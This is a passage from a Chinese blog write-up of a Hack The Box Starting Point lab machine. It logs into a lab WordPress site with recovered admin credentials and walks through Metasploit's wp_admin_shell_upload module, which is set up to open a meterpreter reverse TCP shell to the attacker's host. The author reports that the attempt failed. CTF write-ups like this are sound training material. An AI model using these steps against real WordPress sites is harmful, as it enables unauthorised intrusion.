+<p>点击登录链接，尝试之前获得的密码，试出帐密<code>admin/P@s5w0rd!</code>。</p>
+<p>有个媒体上传链接，点击其中已存在的图片查看保存路径：</p>
+<pre tabindex=0><code>http://10.10.10.29/wordpress/wp-content/uploads/black-shield-shape-drawing-illustration-png-clip-art.png
+</code></pre><p>尝试上传小马，各种绕过，奈何网络太差，总有莫名其妙的报错，放弃。</p>
+<h2 id=2拿webshell>2、拿WebShell<a hidden class=anchor aria-hidden=true href=#2拿webshell>#</a></h2>
+<p>祭出<code>msf</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># 启动matesploit framwork</span>
+msfconsole
+
+<span style=color:#75715e># 使用模块</span>
+msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload
+
+<span style=color:#75715e># 查看参数</span>
+msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; show options
+
+Module options <span style=color:#f92672>(</span>exploit/unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span>:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The WordPress password to authenticat
+                                         e with
+   Proxies                     no        A proxy chain of format type:host:por
+                                         t<span style=color:#f92672>[</span>,type:host:port<span style=color:#f92672>][</span>...<span style=color:#f92672>]</span>
+   RHOSTS                      yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, see https://githu
+                                         b.com/rapid7/metasploit-framework/wik
+                                         i/Using-Metasploit
+   RPORT      <span style=color:#ae81ff>80</span>               yes       The target port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
+   SSL        false            no        Negotiate SSL/TLS <span style=color:#66d9ef>for</span> outgoing connec
+                                         tions
+   TARGETURI  /                yes       The base path to the wordpress applic
+                                         ation
+   USERNAME                    yes       The WordPress username to authenticat
+                                         e with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options <span style=color:#f92672>(</span>php/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.211.55.8      yes       The listen address <span style=color:#f92672>(</span>an interface may be s
+                                     pecified<span style=color:#f92672>)</span>
+   LPORT  <span style=color:#ae81ff>4444</span>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style=color:#ae81ff>0</span>   WordPress
+
+<span style=color:#75715e># 设置参数</span>
+msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set PASSWORD P@s5w0rd!
+PASSWORD <span style=color:#f92672>=</span>&gt; P@s5w0rd!
+msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set RHOSTS 10.10.10.29
+RHOSTS <span style=color:#f92672>=</span>&gt; 10.10.10.29
+msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set TARGETURI /wordpress
+TARGETURI <span style=color:#f92672>=</span>&gt; /wordpress
+msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set USERNAME admin
+USERNAME <span style=color:#f92672>=</span>&gt; admin
+msf6 exploit<span style=color:#f92672>(</span>unix/webapp/wp_admin_shell_upload<span style=color:#f92672>)</span> &gt; set LHOST 10.10.14.43
+LHOST <span style=color:#f92672>=</span>&gt; 10.10.14.43
+
+<span style=color:#75715e># 输入run执行攻击，首先在Kali的4444默认端口使用我们输入的帐密建立反向TCP连接，然后上传payload到网站，成功后自动清除payload并建立meterpreter shell连接</span>
+</code></pre></div><p>再怎么弄都不成功，本地搭的环境却可以，离谱，下一关。</p>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://examplesite.com/tags/hack-the-box/>Hack The Box</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://examplesite.com/post/kali%E5%AE%89%E8%A3%85parallels-tools/>
+<span class=title>« Prev Page</span>
+<br>
+<span>Kali安装Parallels Tools</span>
+</a>
+<a class=next href=https://examplesite.com/post/md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/>
+<span class=title>Next Page »</span>
+<br>
+<span>MD5()函数绕过</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB-Starting Point on twitter" href="https://twitter.com/intent/tweet/?text=HTB-Starting%20Point&url=https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f&hashtags=HackTheBox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB-Starting Point on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f&title=HTB-Starting%20Point&summary=HTB-Starting%20Point&source=https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB-Starting Point on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f&title=HTB-Starting%20Point"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB-Starting Point on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB-Starting Point on whatsapp" href="https://api.whatsapp.com/send?text=HTB-Starting%20Point%20-%20https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB-Starting Point on telegram" href="https://telegram.me/share/url?text=HTB-Starting%20Point&url=https%3a%2f%2fexamplesite.com%2fpost%2fhtb-starting-point%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2021 <a href=https://examplesite.com/>0opsdc</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
